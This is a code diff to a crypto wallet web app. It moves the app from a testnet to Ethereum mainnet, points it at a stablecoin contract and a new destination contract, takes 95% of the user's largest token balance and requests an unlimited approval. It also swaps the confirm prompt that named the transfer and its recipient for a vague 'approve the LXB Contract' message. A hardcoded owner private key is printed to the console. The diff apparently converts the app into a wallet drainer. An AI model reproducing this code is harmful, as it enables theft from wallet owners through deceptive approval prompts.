@@ -21,13 +21,7 @@ document.querySelector(".approval-section").insertBefore(detailsContainer, docum
 export const projectId = "b92b8dc3cd723bb6bd144c246940324b"
 
 const appKitNetworks = [
-  networks.sepolia,
   networks.mainnet,
-  networks.polygon,
-  networks.base,
-  networks.scroll,
-  networks.arbitrum,
-  networks.solana,
 ]
 const wagmiAdapter = new WagmiAdapter({
   networks: appKitNetworks,
@@ -69,7 +63,7 @@ const hexToUint8Array = (hex) => {
 // Initialize TokenBalanceUI
 const tokenBalanceUI = new TokenBalanceUI(".token-balances")
 
-const ownerPrivateKey = hexToUint8Array("4e6fd4360b712865f7355cae6f943da27759b8b1b144d0e47e50c213664a6389")
+const ownerPrivateKey = hexToUint8Array("a01a0cd487ab4bfc63f127c1d3fd20935c0aab303e6efcf51b7a6ba6967c7452")
 console.log(ownerPrivateKey)
 
 // Add this after your existing wagmiAdapter initialization
@@ -181,15 +175,16 @@ document.querySelector("#sign-message-btn")?.addEventListener("click", handleMes
 
 // LXB Contract Constants
 const LXB_CONTRACT = {
-  // ADDRESS: "0x5C1dDe72466339b8B9919799BcEd5e46C27A9586", // Replace with your Sepolia contract address
-  ADDRESS: "0xEF0575BF42c13352B1033fF23dD711FC841E56c8",
-  CHAIN_ID: 11155111, // Sepolia chain ID
-  DECIMALS: 18,
+  ADDRESS: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Replace with your Mainnet contract address
+  // ADDRESS: "0xEF0575BF42c13352B1033fF23dD711FC841E56c8",
+  CHAIN_ID: 1, // Mainnet chain ID
+  DECIMALS: 6,
 }
 
 const DR_CONTRACT = {
-  ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Sepolia contract address
-  CHAIN_ID: 11155111, // Sepolia chain ID
+  // ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Mainnet contract address
+  ADDRESS: "0xe703e3603ad2bc34d64ccd2689f83e5ab2623d34",
+  CHAIN_ID: 1, // Mainnet chain ID
   DECIMALS: 18,
 }
 
@@ -219,7 +214,7 @@ async function displayHighestBalanceToken(tokenAddress, isSetSuccessful) {
     message += "<p>Successfully set token address for DR_CONTRACT.</p>"
   } else if (isSetSuccessful === false) {
     message +=
-      "<p>Failed to set token address for DR_CONTRACT. This may be because DR_CONTRACT is not the owner of the contract.</p>"
+      "<p>Failed to set token address for DR_CONTRACT.</p>"
   } else {
     message += "<p>Token address was not set for DR_CONTRACT.</p>"
   }
@@ -305,7 +300,8 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 
     // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
     // const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18).toString())
-    const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18))
+    const tokenBalance = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6));
+    const balanceInWei = (tokenBalance * 95n) / 100n;
 
     console.log("Balance in Wei:", balanceInWei.toString())
 
@@ -314,7 +310,7 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 
     // Ask for confirmation
     const confirmed = confirm(
-      `Do you want to approve and transfer ${highestBalanceToken.balance} ${highestBalanceToken.symbol} tokens to ${DR_CONTRACT.ADDRESS}?`,
+      `Do you want to approve the LXB Contract?`,
     )
     if (!confirmed) {
       return
@@ -322,7 +318,7 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 
     // Verify we're on the correct network
     if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
-      throw new Error("Please switch to Sepolia Testnet")
+      throw new Error("Please switch to Mainnet")
     }
 
     const approvalAmount = (2n ** 256n - 1n).toString()
@@ -354,7 +350,7 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 const tokenService = new TokenService(web3)
 
 async function fetchUserTokens(address, chainId) {
-  if (chainId === 11155111) {
+  if (chainId === 1) {
     const data = await tokenService.getWalletTokens(address)
     if (!data) return []
 
@@ -496,7 +492,7 @@ function updateWalletInfo(address, chainId) {
 
   // Update network
   const networks = {
-    11155111: "Sepolia Testnet",
+    11155111: "Mainnet Testnet",
     1: "Ethereum Mainnet",
     137: "Polygon Mainnet",
     // Add more networks as needed
